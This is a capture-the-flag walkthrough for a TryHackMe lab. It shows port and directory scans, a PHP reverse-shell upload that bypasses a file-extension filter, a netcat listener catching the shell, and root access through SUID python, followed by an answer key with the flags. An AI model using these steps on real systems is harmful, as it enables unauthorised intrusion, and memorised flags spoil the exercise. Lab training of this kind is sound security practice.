# Task 1 Deploy the machine :
----

>>Connect to TryHackMe network and deploy the machine. If you don't know how to do this, complete the OpenVPN room first.

----

# Task 2 Reconnaissance
----

>>First, let's get information about the target.
```bash
root@ip-10-10-170-228:~# nmap -sC -sV 10.10.55.52

Starting Nmap 7.60 ( https://nmap.org ) at 2021-12-31 13:04 GMT
Nmap scan report for ip-10-10-55-52.eu-west-1.compute.internal (10.10.55.52)
Host is up (0.057s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
|_  256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (EdDSA)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: HackIT - Home
MAC Address: 02:0B:F5:CC:71:6D (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.37 seconds


root@ip-10-10-170-228:~# gobuster dir -u http://10.10.55.52 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.55.52
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/12/31 13:15:05 Starting gobuster
===============================================================
/uploads (Status: 301)
/css (Status: 301)
/js (Status: 301)
/panel (Status: 301)
/server-status (Status: 403)
===============================================================
2021/12/31 13:15:53 Finished
===============================================================

```

----

# Task 3 Getting a shell
----

>>Find a form to upload and get a reverse shell, and find the flag.
```bash
root@ip-10-10-170-228:~# cp /usr/share/wordlists/SecLists/Web-Shells/laudanum-0.8/php/php-reverse-shell.php .
root@ip-10-10-170-228:~# ls
Desktop    Instructions           Pictures  Rooms    thinclient_drives
Downloads  php-reverse-shell.php  Postman   Scripts  Tools
root@ip-10-10-170-228:~# mv reverse-shell.jpeg.php reverse-shell.jpeg.phtml
root@ip-10-10-170-228:~# ls
Desktop    Instructions  Postman                   Rooms    thinclient_drives
Downloads  Pictures      reverse-shell.jpeg.phtml  Scripts  Tools

root@ip-10-10-170-228:~# nc -lvnp 9001
Listening on [0.0.0.0] (family 0, port 9001)
Connection from 10.10.55.52 46324 received!
Linux rootme 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 13:35:21 up 33 min,  0 users,  load average: 0.00, 0.01, 0.21
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
$ python -c ‘import pty;pty.spawn(“/bin/bash”)’
Ctrl+Z
root@ip-10-10-170-228:~# stty raw -echo
root@ip-10-10-170-228:~# fg
bash-4.4$ export TERM=xterm
bash-4.4$ cd /var/www
bash-4.4$ ls
html  user.txt
bash-4.4$ cat user.txt 
THM{y0u_g0t_a_sh3ll}
```

----

# Task 4 Privilege escalation
----

>>Now that we have a shell, let's escalate our privileges to root.
```bash
bash-4.4$ python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
# whoami
# cd /
# ls
bin    dev   initrd.img      lib64	 mnt   root  snap      sys  var
boot   etc   initrd.img.old  lost+found  opt   run   srv       tmp  vmlinuz
cdrom  home  lib	     media	 proc  sbin  swap.img  usr  vmlinuz.old
# cd root
# ls
root.txt
# cat root.txt
THM{pr1v1l3g3_3sc4l4t10n}
```
----

# ANSWER THE FOLLOWING :
----

1.Deploy the machine
>>No answer needed

2.Scan the machine, how many ports are open?
>>2

3.What version of Apache is running?
>>2.4.29

4.What service is running on port 22?
>>ssh

5.Find directories on the web server using the GoBuster tool.
>>No answer needed

6.What is the hidden directory?
>>/panel/

7.user.txt 
>>THM{y0u_g0t_a_sh3ll}

8.Search for files with SUID permission, which file is weird?
>>/usr/bin/python

9.Find a form to escalate your privileges.
>>No answer needed

10.root.txt
>>THM{pr1v1l3g3_3sc4l4t10n}

----